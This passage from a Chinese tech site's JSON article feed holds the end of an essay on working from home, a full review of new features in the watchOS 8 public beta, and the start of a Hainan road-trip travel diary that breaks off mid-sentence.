target=\"_blank\">维基百科里有这么两段描述，</a>它除了舒适区还提出了两个概念——最佳表现区和危险区。在讨论它们的定义之前，我想先说这些并不是定式，而是一种可以动态调整的生活方式。</p>\n<h3>保留舒适区，创造最佳表现区，并避免出现矫枉过正的危险区</h3>\n<p>简单来说，家就是我们的舒适区。对于那些期待自己可以在家办公的人，通常是因为觉得在家自己会更愉悦和自在；而已经在家办公人一定不能否认的是，在家里工作是非常轻松的，甚至偶尔也会松过度。</p>\n<p>想必所有在家工作者在这份工作开始之后，还与之同步的是不断规划和打磨自己的工作区，无论是一个独立的空间，还是仅仅一张宽敞的书桌，在明确它是自己工作的地方之后，都会在不自觉中把它弄得越来越「严肃」。</p>\n<p>这便是「最佳表现区」，因为我们已经意识到如果没有这样的一个物理隔栏，工作效率会越来越低。其实就像我们在做办公室设计时的原则一样，例如整体颜色要过于冷色，灯光需要是高色温的明亮光，并且不能有太多的摆件去干扰视线。也像我们在设计卧室时，有的人喜欢弄得里面丰富充盈，要有椅子小茶几，床头正对安置一个电视或者投影，美其名约「打造私人的放松空间」，结果是睡眠质量越来越低。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/31/article/2e63655815111b3a967bf7220ea2c10f\"><figcaption>虽然我希望办公环境的整体风格简单又冷峻，却又还是会用绿植点缀呼吸</figcaption></figure><p>当我们将生活方式投射到物理环境中时，它是需要有层次感的，底层是舒适区也是我们可以自由放纵的空间，中间层是功能区要有明显的界线意味着这个地方是做某件事的，最后一层是错误示范的危险区，通常因为矫枉过正后而导致负面恶化。</p>\n<p>但危险区是流动的，它没有一个固定的标准，往往会根据不同人的生活习惯而千差万别。</p>\n<blockquote><p>The brain gradually stops registering a sight, sound or feeling if that stimulus remains constant over time. For example, most people are not aware of the sensation of clothing touching their skin. The body becomes \"habituated\" to the feeling and the stimulus no longer registers in any meaningful way in the brain.</p></blockquote>\n<blockquote><p>如果这种刺激在一段时间内保持不变，大脑就会逐渐停止对一种视觉、声音或感觉的记录。例如，大多数人都不会意识到衣服接触皮肤的感觉。身体变得 「习惯」了这种感觉，而这种刺激在大脑中不再以任何有意义的方式记录下来。</p></blockquote>\n<p>2011 年的时候《认知》杂志社发表过一篇文章<a href=\"https://www.sciencedaily.com/releases/2011/02/110208131529.htm\" target=\"_blank\">《Brief diversions vastly improve focus, researchers find》</a>：过去很多学者研究一直认为注意力是有限的，会随着时间的推移下降，但这篇文章却指出当我们逐渐表现不佳的时候并非是注意力被消耗，而是在无意识间失去了对这件事的关注；但我们总是在关注一些东西，它和注意力的容量并无太大关系。</p>\n<p>我的危险区不在于太舒适或太严肃，而是「束缚」，作为一个很容易「分心」的人，我需要有一个固定的位置和设计暗示自己「走到这里就应该这么做」，以便尽快进入状态；但随之而来的，我也希望这个空间有一定的弹性让我可以恰到好处的分心，甚至我认为适时的分心是我激发创造力的催化剂——怎么说呢，天马行空不落于地，但如果是「工作模式」的奇思妙想，我便常有了新的选题或计划。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/31/fdcdb7b1f42def517edd436c457b02a2.jpg\"><figcaption>我虽然将客厅与书房合并在同一个空间但却又泾渭分明</figcaption></figure><p>这是一种不容易描述的状态，但落实到执行时，我把舒适区和最佳表现区融合在了一个物理空间里，尽管外观设计是它们彼此的物理隔栏，但置身其中的我并没有受到约束。这是一种理性揉杂感性的自我审视，我希望你也能认清自己的惰性诱因，但也大方承认自己的抗拒来源。</p>\n<p>积极的对立面是惰性，但舒适的反面不一定就得「不适」，或许自在也很重要？</p>\n<p>那我们回到第一个问题，这地儿是家，也是办公室，两者并不冲突，而工作也可以和生活和谐并存。</p>\n<h2>在家办公好像更难？</h2>\n<p>在家办公也并非十全十美，它会模糊掉一个人的工作效率。从工厂到公司，数十年的发展让「工作能力」变得越来越难以量化，过去我们可以计算一个纺织女工一天可以生产多少布匹，但今天你绝不能去单一考察某个文员当月共做了几个 PPT——无论坐班还是在家，我们都已经进入了一个多线程工作的时代。</p>\n<p>少数派的工作分配其实清晰又混乱，以编辑部为例，每个编辑除了日常的撰稿审稿工作，同时还肩负其它至少一个的岗位，例如付费教程、软件销售或者社区运营，我们也固定了每天的集体早会和每周两次的选题会。看起来真是规整又高效，但靠近一点，大家的工作却又常常重合叠加，例如某个编辑的选题需要其它同事的协作，那这就不再只是这个编辑自己的工作了，对其它编辑来说还成了一种计划外的「加班」；而商务同事不断有新的合作启动，往往需要指定不同领域的编辑参与，但这可不是加班，却又突如其来。</p>\n<p>而我相信这是多数公司和职员的常态，于是我们需要克服的一个心态是：今天我努力了吗？</p>\n<p>过去坐班时，且不论究竟产出多少，「我好好坐在那儿」就是一种自我的焦虑缓解——你不要管我在干嘛，反正我在上班；但在家办公之后，因为大部分时候并不是当日事当日毕，那么在只是推进工作而没有产出的今天，我们往往容易陷入焦虑——因为没有人知道自己今天做了什么——甚至有可能上升到担心同事或者领导是否会对自己有意见。好在因为少数派是一个和谐友好的群体，大部分时候的这种担忧都只是自己无缘由的焦虑。</p>\n<h2>除了合理地规划，也需要定期复盘</h2>\n<p>每个人都有自己的工作方式，但少数派内部有两个机制用以管理每个人的工作成果，首先是工作目标：我们需要制定并公开自己的工作目标，不仅是自我管理，也是同事对自己的期待。</p>\n<p>作为一个内容平台，少数派最主要的工作产出就是稿件，编辑部也是公司里人数最多的一个部门，我们首先规定的是首页每天至少更新的稿件数量。但它是一个相对变量，应对不同的工作日、周末和节假日，都可以适时调整。但是在有限的计划下，也促成了我们每个编辑的工作量和松紧度。</p>\n<p>例如偶遇社区文章枯竭，选题匮乏的时期，我们就需要「快马加鞭」一些；但如果储稿丰富，大家也可以稍作休怠。</p>\n<p>而即便如此，我们还是需要根据自己的领域方向、稿件来源和工作内容等给自己定制一个月度计划，没有强制要求但要如一个成熟的大人般自觉且负责，「每月是否完成稿件目标」是甩手掌柜老麦在了解大家工作状态时的主要手段。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/31/article/ae39e3b2325480146a77f02ba9a8949c\"><figcaption>我们会在飞书中管理并公开自己近期的工作内容，除了协作也利于信息对等</figcaption></figure><p>但计划是开始，结束仍需要复盘。如前文所说，我们每个月的工作是变幻莫测的，无论超额完成还是低于预期都是常态，那这个时候都需要给自己和管理者一个交代。毕竟低质量的超额并不优秀，有了创新的耽误也不全是坏事。</p>\n<p>值得一提的是，你可以在复盘中向老麦「索取」，无论是薪资增长还是奖励发放，你都可以有理有据的争取自己应得的回馈。</p>\n<p>很多人希望自己在工作中有好习惯高效率，在少数派的辐射群体里也热衷于所谓的「量化管理」，但很多人往往忽视了工作不止有量，它还涉及到自我和公司层面的「满足」，而满足通常来自于超出期待的惊喜。在家办公让我们脱离了很大一部分的「装模作样」和「忍辱负重」，我们应当用这份自在换取超出程式之外的产出，而这不一定只来自产出，还有就是我们对自己和工作是否负责。</p>\n<p>所以在家办公的确更难，自我约束、自我管理和自我协调还都只是表面，更大的议题在于我们有没有对这份自由负责。作为一种新型的办公模式，在家办公克服了很多传统办公时代衍生的陋习，而进步不要只用来赞美时代，也要落实到每一独立的个体。</p>\n<p>标题提出了一个看似简单问题：逃离办公室以后，我们去哪？我想目的地不是家里，也不是其它得以地理套利的良处，而是做出这个行动的自己——自我。工作从来就是，也应该是生活的一部分，只是被办公室及其衍生出来的办公室文化稀释了本质并杂糅了一些毫无意义的形式，逃离办公室的我们要回到的是工作本身，并获得愉悦的生活。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/66353"},{"title":"watchOS 8 推出首个公测版，这些新功能值得尝鲜体验","date":"2021-07-04 07:01:56","description":"\n<p>最近，Apple 终于放出了 watchOS 8 的首个公测版本（Public Beta）。watchOS 8 除了新增了人像表盘外，在系统 UI 和应用体验上也都在向 iOS 靠拢。同往年一样，少数派也为你整理了 watchOS 8 中值得关注的那些新功能，希望能帮你提前预览新系统。</p>\n<p>关联阅读：<a href=\"https://sspai.com/post/67514\" target=\"_blank\">iOS / iPadOS 15 公测版来了：新系统升降级指南 &amp; 注意事项</a></p>\n<p></p>\n<div>\n<p>WWDC21 开发者大会期间，少数派也为大家带来了针对新系统、新技术的持续跟进和报道，也与几位长期关注和参与 Apple 生态工作的开发者和产品人进行了深度讨论。为了让你更加完整和系统性地回顾这些内容，少数派也将它们整理成了专题页面，你可以访问下方链接查看我们带来的热点资讯、深度报道以及之后更新的更多内容。</p>\n<p>📱 <a href=\"https://sspai.com/page/wwdc21\" target=\"_blank\" class=\"insert-link\">少数派带你看 WWDC21</a></p>\n</div>\n<p></p>\n<h2>如何升级到 watchOS 8</h2>\n<p>⚠️ 注：Apple Watch 升级之后<strong>无法自行降级</strong>回正式版系统，不建议使用主力机升级尝鲜。</p>\n<p>在升级 watchOS 7 公测版系统之前，你必须先将 iPhone 升级到 iOS 15 的测试版，否则你无法将 Apple Watch 与 iPhone 进行配对。watchOS 8 的硬件要求与 watchOS 7 一样，支持 Apple Watch Series 3 及更新的机型。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/b55a302c9ee8e8b59793ab862f0cb94f.jpeg\"></figure><p>升级 watchOS 8 前，你需要在 <a href=\"https://beta.apple.com/sp/zh-CN/betaprogram/\" target=\"_blank\">Apple Beta 版软件计划</a> 中登录并下载 watchOS 8 的描述文件。建议直接通过 iPhone 下载，下载后可以直接打开描述文件并安装。如果你是在 Mac 上下载，也可以通过隔空投送的方式发送到 iPhone 上。重启设备之后，你就可以收到 watchOS 8 公测版系统的更新了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/a549f0d94de7d5821f68eaf205abe5a5.PNG\"></figure><h2><strong>UI 改动、支持触感反馈</strong></h2>\n<p>Apple 在发布会上并没有对 UI 的变动作太多的说明，不过当我真正上手 watchOS 8 后，还是能感受到它在很多地方都有了改动。</p>\n<h3>新增人像模式表盘</h3>\n<p>watchOS 每次更新都会伴随着新表盘的出现，在 watchOS 8 中，人像模式表盘成了许多人眼里的「重磅更新」。想要设置人像表盘，你只需要在 Watch 应用中选择人像表盘（如果 iOS 15 及 watchOS 8 的版本为 Developer Beta 1，则不会出现人像表盘），随后将自己拍摄的人像照片导入即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/a9209295138791081dd60af2fa0904eb.png\"><figcaption>图 / Apple</figcaption></figure><p>当你导入一张照片后，系统会自动识别画面中的主体和背景，并提供三种表盘样式。其中最特别的莫过于「顶部后方」，它会将时间放在画面主体后方。在实际体验中，如果照片主体不是人的话，往往不会出现「顶部后方」的选项。因此，你或许不能用猫猫来做人像表盘了（可以设置为人像模式表盘，但不支持「顶部后方」样式）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/7cf8173c7811fb6a43aa2a251f76e6c2.PNG\"></figure><p>此外，人像模式表盘还支持 3 种字体样式和 1 个复杂功能，你可以根据自己的喜好进行调整。</p>\n<h3><strong>与 iOS 更加统一的设计</strong></h3>\n<p>watchOS 8 在 App 内融入了 iOS 上的大标题设计，在视觉观感上与 Apple 其他移动系统更加统一。不过在 Apple Watch 这么小的屏幕上使用大标题设计无疑压缩了屏幕利用率。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/30d4050b737819c3cee51984b49434e9.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>拿「设置」来说，在 watchOS 7 中，你不需要滚动屏幕就能轻松点到「通用」，但 watchOS 8 则需要向上滚动屏幕才能更好地点击到。与 iOS 一样，当你向上滚动屏幕后，标题也会缩小到上方，不影响正常使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/dc919b84a8cef64d75b5424abda7018e.PNG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>左：watchOS 7，右：watchOS 8</figcaption></figure><p>不过，由于 watchOS 大部分 App 都采用了卡片形式来展示项目，经常需要在打开 App 后滚动屏幕来找到特定内容。因此，新的大标题设计虽然降低了屏幕利用率，但对实际体验的影响并不大。</p>\n<h3><strong>优化表盘设置过程</strong></h3>\n<p>在 watchOS 8 中，新增表盘的界面也迎来了大改，增加了分类选取界面以及表盘介绍。原先的设置中，在你选完表盘风格后，它会直接应用在手表上，你需要再次长按并选择「编辑」才能进行自定义。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/d74fd8b9f2fc8df8afcab86f94006ac6.gif\"><figcaption>在 watchOS 7 中添加表盘</figcaption></figure><p>在新的表盘设置界面里，你会看到表盘以分类卡片的形式展示出来，点击左侧的表盘图标则可以查看它的详细介绍。如果你想添加某个表盘，只需要点击右侧的「添加」按钮即可直接进入编辑界面，完成编辑后按下数码表冠就能保存并退回表盘。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/26e0af7fe926d012ad4c62ae09a21dc7.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>在 watchOS 8 中添加表盘</figcaption></figure><p>相比于 watchOS 7 繁琐的表盘设置步骤，watchOS 8 的设置过程显然要更加直观且方便。对我来说，不再需要打开手机也能获得非常舒适的表盘设置体验，又让 Apple Watch 多了一个脱离手机的理由。</p>\n<h3><strong>App 视图新增长按菜单</strong></h3>\n<p>watchOS 8 还为 App 视图增加了长按菜单，当你在 App 视图长按应用或空白区域便会打开菜单。你可以在菜单中修改 App 的展示方式，或是选择编辑 App。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/4f369bd7a2a9a43ffc2f4a5af1f3a1c3.gif\"><figcaption>谁会想到这个界面居然不能截图🌚</figcaption></figure><p>如果你经常需要切换 App 视图来查找应用的话，此功能会是一个非常高效的更新，至少你不再需要到「设置」或手机上切换视图了。但长按菜单的加入也让删除应用的步骤又多了一步，对于没有切换视图需求的用户来说，这个改动未必是个好消息。</p>\n<h3><strong>系统触感反馈</strong></h3>\n<p>系统触感反馈也许是 watchOS 8 里最「无感」的一个更新，因为它自然得就像本该存在的一个特性。至少在我更新完系统，输入密码时的振动反馈并不让我觉得意外或惊喜，反而觉得这是本来就有的功能。</p>\n<p>除了输入密码时的按键反馈外，「设置」里的开关、「电话」里的拨号键盘等地方都有了交互反馈。当然，你也可以在「设置 - 声音与触感」中将「系统触感反馈」关闭。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/89b3be31f6cb3e4bdcb4d57063ed73d8.PNG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>watchOS 8 新增「系统触感反馈」</figcaption></figure><h3><strong>控制中心微调</strong></h3>\n<p>本次更新还对控制中心进行了微调，原先分布在角落的手机、定位等图标被集中放在了顶部居中的位置。在你开启专注模式后，对应的图标也会显示在其中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/ba690073120b4871f643bd2ef40709d5.PNG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>左：watchOS 7，右：watchOS 8</figcaption></figure><p>除此之外，控制中心也删去了独立的「睡眠」开关，并整合进「专注」菜单中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/a93f6f0cec9df91e5ccad122ac4ba6f4.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>watchOS 8 的睡眠模式被放在「专注」里</figcaption></figure><h2><strong>iMessage 体验优化</strong></h2>\n<p>本次更新中，iMessage 迎来了非常大的改动，其中最直观的就是输入界面的变化。在 watchOS 8 中，iMessage 的输入界面进一步朝 iOS 靠拢，从原先的多个图标变为 App Store 图标 + 输入框。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/f330d19d97a399bdfafa081d3ab2b89f.PNG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>左：watchOS 7，右：watchOS 8</figcaption></figure><p>原先的 Digital Touch、语音消息和 Apple Pay 等功能都被收入了 App Store 图标里。当然，你还可以在这里面发现一个新的粉色图标，这是 watchOS 为 iMessage 带来的新功能：#image。你可以用它在 GIPHY 搜索动图并直接发送给朋友。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/e5fc9270cbebb6568d0c2f071f00389c.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>由于网络原因，在国内访问 GIPHY 看到的大概率是右图中的画面</figcaption></figure><p>除此之外，watchOS 8 还对文字输入体验做了优化。过去在输入文字时，如果想要将光标移到特定位置，就得先双击它前方的词语才能移动。但如果你想更改词语中的某个字，或者系统识别错了词语的话，你就只能删掉后再重新输入，非常麻烦。</p>\n<p>在 watchOS 8 中，你可以直接用数码表冠来移动光标，配合表冠的振动反馈，你可以非常轻松地停在任意位置。此外，原先的表冠选词也得以保留，你只需要选中想要修改的词语，并旋转数码表冠就可以了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/237f91fa90a5add9d0406e358489c15d.gif\"></figure><p>不仅如此，watchOS 8 还针对多语言混排、Emoji 进行了优化。在输入界面向上滑动屏幕即可切换不同的语言进行输入，对于有中英混排需求的人来说，再也不用担心写出来的字母被识别成汉字了。如果你想在文字中插入 Emoji，也只需点击左下角的 Emoji 图标并在菜单中选择即可，非常方便。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/13/268413aa569906ecd912dea1fa67fdee.gif\"></figure><h2><strong>系统 App 更新</strong></h2>\n<p>本次 watchOS 的更新更多还是聚焦在系统应用的更新上，无论是全新设计的相册、音乐，还是有了新功能的计时器、体能训练，都能给你带来不同于以往的体验。</p>\n<h3><strong>全新设计的「照片」应用</strong></h3>\n<p>在过去的 watchOS 里，我们只能在 Apple Watch 上查看自己在 iPhone 上选定的相册，并左右滑动查看照片。虽然也能实现「查看照片」的功能，但这样的体验显然不能称得上是一个「相册」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/1134ee1d0e00f84014851749216308eb.gif\"></figure><p>相比之下，watchOS 8 的「照片」应用就更像一个「相册」了。虽然你还是只能选中一个相册导入进 Apple Watch，但新增的层级功能让它有了「相册」的感觉。</p>\n<p>进入「照片」应用后，你不再会直接看到照片，而是先看到相册的选择界面，点开一个相册后，则会看到类似 iOS 那样的照片网格，再次点击照片才能进入全屏界面。这样的操作逻辑更加贴近 iOS，在使用体验上也比原本要更加舒适。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/24d5e949f879d2238ccd128e8f450ee8.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>全新的「照片」应用</figcaption></figure><p>既然 watchOS 为「照片」应用增加了层级，肯定不能只在上面放一个相册。于是，watchOS 8 还将 iOS 的「回忆」功能带到了 watchOS 上。</p>\n<p>你只需要在 iPhone 上的 Watch 应用内找到「照片」，随后打开「同步回忆」，系统便会自动将你的照片回忆同步到 Apple Watch 上。这些照片会以「回忆」相册的形式在 Apple Watch 上显示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/4a7424dea764124b8f802a321219352b.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>值得一提的是，「回忆」相册的显示方式与普通相册的照片网格不同，而是采用了大小不等的「马赛克」式排列。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/fc85ad87f3c69010fd925fef46039390.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>道理我都懂，但这碗泡面真的不「美味」</figcaption></figure><p>除了展示效果提升外，全新的「照片」应用也带来了交互上的改动。在原先的「照片」里，我们只能将选中的图片设置为表盘，但在 watchOS 8 中，你还可以用分享按钮将照片通过 iMessage 或邮件的方式分享给朋友。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/1e9ae1cbe6339296eddc0072c68a590b.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>watchOS 8 支持直接分享照片</figcaption></figure><h3><strong>「呼吸」更名为「正念」</strong></h3>\n<p>不知道你会不会跟我一样，经常使用 Apple Watch 的「呼吸」应用来让自己放松。事实上，有规律的深呼吸不但能够帮你缓解压力，也能够帮你更好地专注在手头的工作，甚至是促进入睡。</p>\n<p>在 watchOS 8 中，「呼吸」应用迎来了一次大更新。首先便是它的名字由「呼吸」改为「正念」，并加入了「沉思」功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/8d348bd71e3f8b8528f6e424a167812a.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>全新的「沉思」功能可以帮助你更加专注，并且有助于增强积极的情绪。你可以选择让自己最能够放松的方式来进行「沉思」，无论是闭上双眼，舒服地坐着，还是来回踱步都可以，不会像「呼吸」一样被打断。</p>\n<p>开启「沉思」后，Apple Watch 会向你提出不同的建议，比如「想想那些令你开心的事情，它们为什么会令你开心」，或是「想想那些令你心怀感激的事情」。作为初期测试版本，目前仍有部分建议未汉化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/601e3a6d0cf0f11e10840778585ad8e6.gif\"></figure><p>同时，本次更新还给「正念」应用带来了更精致的动画和退出功能。在进行「呼吸」或「沉思」的过程中，你可以随时向右滑动屏幕并提前结束，此次数据将不会进行记录。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/7e0e4867065ecc2b8e445a1ed21ed5eb.gif\"></figure><h3><strong>「计时器」支持多个倒计时</strong></h3>\n<p>在 watchOS 8 里，「计时器」终于支持同时设置多个倒计时了。同时，Apple 也将「自定」和「最近使用」从底部提升到了顶部。</p>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/62b88c14a81e3817d704121366bb064d.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h3><strong>音乐 App 重新设计</strong></h3>\n<p>与「照片」应用一样，「音乐」应用也获得了全新的设计。除了将菜单图标改为彩色以外，你现在也可以在「资料库」中直接查看专辑图，并打开对应专辑进行播放，这样的改动也更贴近 iOS 使用习惯。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/795bbd245523be95c8b6bf99771dadd3.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h3>\n<strong>「体能训练」新增</strong>太极</h3>\n<p>作为 Apple Watch 主打的功能之一，「体能训练」在这次的更新中除了加入太极之外，还新增了一个特别实用的功能：语音播报。</p>\n<p>当你在锻炼中达到特定节点时，Apple Watch 会直接通过语音向你播报，你不用抬起手腕也能知道自己当前的完成进度。以计时锻炼为例，Apple Watch 会在目标完成一半时提醒你「已达成一半，XX 分钟」，如果你按下了暂停键，它也会通知你「训练暂停」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/1e1cc5cf53258d734820300c4147d3ff.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>请自行脑补 Siri 的声音🌚</figcaption></figure><h3><strong>全新设计的「家庭」应用</strong></h3>\n<p>watchOS 本次更新还带来了全新设计的「家庭」应用，你可以更加方便地管理家中的智能设备。同时 watchOS 8 也支持绑定更多的智能设备并与之联动，比如有人按门铃时，Apple Watch 就会弹出相应通知，如果门口有摄像头的话，还可以直接查看摄像头拍摄到的内容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/3a25e84938ac4fad90a67ed870f7914d.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>图 / Apple</figcaption></figure><h2><strong>新增多个 App</strong></h2>\n<p>除了原有应用的更新外，watchOS 8 还新增了 4 个应用。</p>\n<h3><strong>查找设备、查找物品</strong></h3>\n<p>在 watchOS 7 里，虽然有一个「查找」图标的应用，但只能用于查找联系人，而无法定位自己的其他设备。到了 watchOS 8，Apple 在 watchOS 上将「查找」功能进行细化，分成了查找设备、查找物品和查找联系人 3 个应用，并单独绘制了不同的图标。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/62725092f890ed3058696ba3012ebb46.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>以「查找设备」为例，你可以直接在 Apple Watch 上看到自己其他设备的定位，并进行播放声音、启用丢失模式等操作，或者直接导航指设备所处位置。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/3240079d5c75ee252d3d79ae9db546f3.JPEG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h3><strong>通讯录</strong></h3>\n<p>其实在 watchOS 7 的「电话」应用中就已经有「通讯录」的选项，但你只能进行打电话、发短信等操作，无法添加、删除或编辑联系人。到了 watchOS 8，Apple 终于为我们带来了「完整版」的通讯录应用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/22/5639ee5a74fbd5f2e1288764448f602f.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>应用目前支持编辑联系人的姓名、电话、邮箱、地址等信息。除了屏幕比较小，以及缺少一些词条（比如关系、昵称）之外，基本可以代替 iOS 来快速添加联系人了。</p>\n<h3><strong>提示</strong></h3>\n<p>watchOS 8 还将 iOS 里的「提示」应用也带到了 Apple Watch 上，对于刚购买 Apple Watch 的用户来说，可以通过「提示」应用快速上手新设备。在升级到新的系统版本以后，你也可以通过「提示」应用来快速了解这次都有哪些更新。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/10/50581b0827a434e70d70335d5d6dc79d.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h2><strong>专注模式更新</strong></h2>\n<p>与 iOS 15 一样，Apple Watch 也针对「专注」进行了更新，你可以将 iPhone 上的专注模式设置镜像到 Apple Watch 上，并在控制中心里快速启用。此外，专注模式还会根据你的使用习惯进行推荐，比如当你开始体能训练时会建议你开启对应的专注模式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/11/26ffcb8f2870669541c611d28d752d05.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h2><strong>更多</strong></h2>\n<p>除了上面提到的更新外，watchOS 8 中还有这些改动：</p>\n<ul>\n<li>常亮显示屏（Always-On Display）支持计算器、地图和音乐等 App。</li>\n<li>Fitness+ 支持锻炼筛选。</li>\n<li>天气应用支持恶劣天气通知，</li>\n<li>消息提醒的「关闭」按钮改为「忽略」。</li>\n<li>新增「辅助触控」功能，可以通过手势来操控 Apple Watch。</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，阅读更多 <a href=\"https://sspai.com/page/wwdc21\" target=\"_blank\">WWDC21 专题报道</a> 👨🏻‍💻</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67499"},{"title":"快乐飞旅行报告 06：自驾在海南最美公路","date":"2021-07-04 04:01:09","description":"\n<p>在 2020 年底，南航推出了快乐飞 2.0，我终于下定决心开启周末全国飞的计划。上半年假期多，南航快乐飞不局限在周末，买它准没错。万万没想到的是疫情再次来袭，一直拖到了今年 3 月底，我才正式出行，好歹也算抓住了快乐飞的下半程。</p>\n<p>本篇是我的快乐飞旅行游记的第六篇，我会以一个系列的形式向大家分享我这三个月的快乐飞旅行见闻，希望大家喜欢。（到最后，如果南航继续推出快乐飞 3.0，我再来做个快乐飞购买总结。）</p>\n<hr>\n<p>在武汉的游记那篇里，我就说过，抢到节假日的快乐飞机票几乎不可能。我早早地买好了 4 月 30 日由杭州飞往海口的机票，但由于票数限制，5 月 5 日的返程票一直售罄，只能选择 5 月 6 日请假回杭。不过意外的是到了距离出发前三天，返程票突然出现两个名额，我立刻订好，成就了五一的海南之行。</p>\n<p>这一次是和同事共 10 人的海南自驾游，从海口出发，经过文昌品尝正宗椰子鸡，再到万宁参加音乐节和夏日冲浪，最后回海口返程。</p>\n<p>五一劳动节假期，社交媒体都在报道全国热门景区人多拥挤摩肩擦踵。令我意外的是，由杭州飞往海口的航班竟然都没有满座，登机时乘务员一直提示飞机后部座位空余，可以换座。想来大多数游客都会选择三亚出行，我们选择海口反而逃过一劫。</p>\n<h2>海口老爸茶——恒兴发茶店</h2>\n<p>4 月 30 日晚上才抵达海口美兰机场，到达民宿已经深夜，直接睡了。</p>\n<p>人多拖拉，到第二天（5 月 1 日）早上 11 